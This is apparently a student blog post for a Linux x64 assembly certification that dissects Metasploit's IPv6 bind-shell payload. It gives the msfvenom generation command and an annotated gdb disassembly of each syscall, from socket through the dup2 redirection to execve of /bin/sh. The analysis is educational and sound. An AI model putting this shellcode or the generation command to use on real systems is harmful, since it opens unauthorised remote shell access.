Title: SLAE64 - Assignment 5.3
Date: 2022-06-25T09:38:01.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=7">https://www.pentesteracademy.com/course?id=7</a></p><p>Student ID: PA-30398</p><h2 id="analysis">Analysis</h2><p>For the fifth assignment, I decided to analyze the following shellcode samples:</p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>linux/x64/meterpreter/reverse_tcp</td>
<td>Inject the mettle server payload (staged). Connect back to the attacker</td>
</tr>
<tr>
<td>linux/x64/pingback_reverse_tcp</td>
<td>Connect back to attacker and report UUID (Linux x64)</td>
</tr>
<tr>
<td>linux/x64/shell_bind_ipv6_tcp</td>
<td>Listen for an IPv6 connection and spawn a command shell</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>In this post, I'll document the logic of the third shellcode, <code>linux/x64/shell_bind_ipv6_tcp</code>.</p><p>Let's start from the very beginning, i.e. generating the shellcode. You can do so by means of the <em>ruby</em> script <code>msfvenom</code>, available by default Kali Linux distributions.</p><p>Follows the command I used in order to generate the shellcode for this assignment:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">msfvenom -p linux/x64/shell_bind_ipv6_tcp LHOST=fe80::a00:27ff:feb1:f461 LPORT=443 -f elf -o shellcode

# [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
# [-] No arch selected, selecting arch: x64 from the payload
# No encoder specified, outputting raw payload
# Payload size: 94 bytes
# Final size of elf file: 214 bytes
# Saved as: shellcode</code></pre><figcaption>Shellcode Generation</figcaption></figure><p>Next, we can start the analysis by means of the tool <code>gdb</code>:</p><pre><code class="language-bash">gdb -q ./shellcode
# Reading symbols from ./shellcode...
# (No debugging symbols found in ./shellcode)
(gdb) starti
# Starting program: /home/kali/slae64/exam/assignment/5/part/3/shellcode 

# Program stopped.
# 0x0000000000400078 in ?? ()
(gdb) x/8i $pc
# =&gt; 0x400078:    push   0x29
#    0x40007a:    pop    rax
#    0x40007b:    push   0xa
#    0x40007d:    pop    rdi
#    0x40007e:    push   0x1
#    0x400080:    pop    rsi
#    0x400081:    xor    edx,edx
#    0x400083:    syscall
</code></pre><h2 id="socket-creation">Socket Creation</h2><p>Let's start analyzing the first instructions:</p><pre><code class="language-nasm">; set RAX to 0x29 (syscall sys_socket)
push   0x29
pop    rax

; set RDI (first parameter of sys_socket) to 10
push   0xa
pop    rdi

; set RSI (second parameter of sys_socket) to 1
push   0x1
pop    rsi

; set RDX (third paramter of sys_socket) to 0
xor    edx,edx

; invoke sys_socket
syscall
</code></pre><p>You could also convert these instructions in the following C code:</p><figure class="kg-card kg-code-card"><pre><code class="language-cpp">int socket(
  10,            // AF_INET6
  1,            // SOCK_STREAM
  0,            // IP protocol
);
</code></pre><figcaption>C code for creating a TCP socket</figcaption></figure><h2 id="socket-binding">Socket Binding</h2><p>Right after the creation of the TCP socket, there some instructions that deal with the binding operation:</p><pre><code class="language-nasm">(gdb) x/15i $pc
=&gt; 0x400085:    push   rax
   0x400086:    pop    rdi
   0x400087:    cdq    
   0x400088:    push   rdx
   0x400089:    push   rdx
   0x40008a:    push   rdx
   0x40008b:    pushw  0xbb01
   0x40008f:    pushw  0xa
   0x400093:    push   rsp
   0x400094:    pop    rsi
   0x400095:    push   0x31
   0x400097:    pop    rax
   0x400098:    push   0x1c
   0x40009a:    pop    rdx
   0x40009b:    syscall </code></pre><p>What's peculiar about these instructions is that since the shellcode I generated is based on the <strong>IPv6</strong> protocol, it doesn't employ the usual <strong>sockaddr</strong> structure:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">; save the file descriptor of the socket into RDI
push   rax
pop    rdi

; sign extend RAX into RDX (zeroing it) 
cdq

; push 24 NULL bytes 
push   rdx
push   rdx
push   rdx

; member sin6_port of the sockaddr_in6 struct
; in this case: port 443 in bid-endian notation
pushw  0xbb01

; member sin6_family of the sockaddr_in6 struct
; in this case: AF_INET6
pushw  0xa

; 2nd argument of bind: pointer to sockaddr_in6 struct
push   rsp
pop    rsi

; using the syscall 0x31 i.e., bind
push   0x31
pop    rax

; 3rd argument of bind: size of the sockaddr_in6 struct
; size in this case: 28 bytes
push   0x1c
pop    rdx

; calling the syscall bind()
syscall </code></pre><figcaption>Analysis of the binding operation</figcaption></figure><p>As shown in the snippet above, the author of the shellcode used a structure of 24 bytes, which corresponds with <code>sockaddr_in6</code>.</p><p>You can find more information regarding the IPv6 protocol and its data structure in the page below:</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://man7.org/linux/man-pages/man7/ipv6.7.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">ipv6(7) - Linux manual page</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><span class="kg-bookmark-author">Linux manual page</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://man7.org/tlpi/cover/TLPI-front-cover-vsmall.png" alt=""></div></a></figure><h2 id="listening">Listening</h2><p>After the binding operation, the shellcode should now perform a call to the <code>listen</code> function:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">(gdb) x/5i $pc
=&gt; 0x40009d:    push   0x32      ; use syscall 0x32: listen
   0x40009f:    pop    rax
   
   0x4000a0:    push   0x1       ; 2nd parameter of listen: backlog
   0x4000a2:    pop    rsi       ; i.e. max. number of connections
   0x4000a3:    syscall</code></pre><figcaption>Set socket as passive</figcaption></figure><p>You can find more information about the syscall <code>listen</code> visiting the link below:</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://man7.org/linux/man-pages/man2/listen.2.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">listen(2) - Linux manual page</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><span class="kg-bookmark-author">Linux manual page</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://man7.org/tlpi/cover/TLPI-front-cover-vsmall.png" alt=""></div></a></figure><h2 id="accepting-connections">Accepting Connections</h2><p>After that call to the syscall <code>listen</code>, we have the following block of instructions:</p><pre><code class="language-nasm">(gdb) x/10i $pc
=&gt; 0x4000a5:    push   0x2b
   0x4000a7:    pop    rax
   0x4000a8:    cdq    
   0x4000a9:    push   rdx
   0x4000aa:    push   rdx
   0x4000ab:    push   rsp
   0x4000ac:    pop    rsi
   0x4000ad:    push   0x1c
   0x4000af:    lea    rdx,[rsp]
   0x4000b3:    syscall </code></pre><p>Analyzing them, I found out that it performs some weird operations: it calls the syscall <code>accept</code> in order to allow the listening socket to receive a connection, however it doesn't allocate 28 bytes of memory as done before for the <code>bind</code> syscall.</p><p>Instead, it only allocates 16 bytes, which isn't nearly enough for an IPv6 address:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">; use syscall accept
push   0x2b
pop    rax

; clear RDX by sign-extension
cdq    

; push 16 NULL bytes (empty sockaddr structure)
push   rdx
push   rdx

; 2nd argument of accept: buffer for the sockaddr_in6 struct
; should be 28 bytes, but in this case it's only 16
push   rsp
pop    rsi

; 3rd argument of accept: pointer to the size of the buffer
; in this case it's 28 bytes
push   0x1c
lea    rdx,[rsp]

; call syscall accept
syscall </code></pre><figcaption>Shellcode calling syscall accept</figcaption></figure><p>Nonetheless, the shellcode sets the third argument to 28. Doing so, the syscall will store a 28-bytes address starting from the base address indicated by the register <code>RSI</code>.</p><p>This way, the syscall would be able to overwrite the remaining 12 bytes if needed.</p><h2 id="io-redirection">I/O Redirection</h2><p>Once a connection has been accepted by the server socket, it needs to redirect three <em>standard file descriptors</em>:</p><!--kg-card-begin: markdown--><ul>
<li>standard input (stdin) -&gt; file descriptor 0</li>
<li>standard output (stdout) -&gt; file descriptor 1</li>
<li>standard error (stderr) -&gt; file descriptor 2</li>
</ul>
<!--kg-card-end: markdown--><p>The shellcode uses the syscall <code>dup2</code> to redirect these file descriptors, looping from 2 to 0:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">(gdb) x/8i $pc

   ; save the file descriptor of the client socket into RDI
   ; 1st argument of dup2
=&gt; 0x4000b5:    xchg   rdi,rax

   ; 2nd argument of dup2
   ; file descriptor to redirect
   0x4000b7:    push   0x3
   0x4000b9:    pop    rsi
   
   ; use syscall 0x21: dup2
   0x4000ba:    push   0x21
   0x4000bc:    pop    rax
   
   0x4000bd:    dec    esi
   
   ; call dup2
   0x4000bf:    syscall
   
   ; go back to redirect the other standard file descriptors
   0x4000c1:    loopne 0x4000ba</code></pre><figcaption>Redirection of stdin, stdout, and stderr</figcaption></figure><h2 id="spawning-a-shell">Spawning a shell</h2><p>The last block of assembly instructions involves the usage of the syscall <code>execve</code> in order to spawn a shell.</p><p>In this case, after redirecting the standard file descriptors, the shellcode spawn a <code>/bin/sh</code> shell.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">(gdb) x/8i $pc

   ; using syscall execve
=&gt; 0x4000c3:    push   0x3b
   0x4000c5:    pop    rax
   
   ; clear RDX by sign-extension of RAX
   0x4000c6:    cdq
   
   ; set RBX to point to "/bin/sh" (reversed)
   ; followed by a NULL byte
   0x4000c7:    movabs rbx,0x68732f6e69622f
   0x4000d1:    push   rbx
   
   ; 1st argument of execve: pointer to program to call
   0x4000d2:    push   rsp
   0x4000d3:    pop    rdi
   
   ; invoke execve
   0x4000d4:    syscall</code></pre><figcaption>Spawn <code>/bin/sh</code></figcaption></figure><p>Note that the instruction <code>movabs</code> contains a NULL byte in the path of the shell. </p><p>To improve it, you can use a path such as <code>/bin//sh</code> or <code>//bin/sh</code>.</p>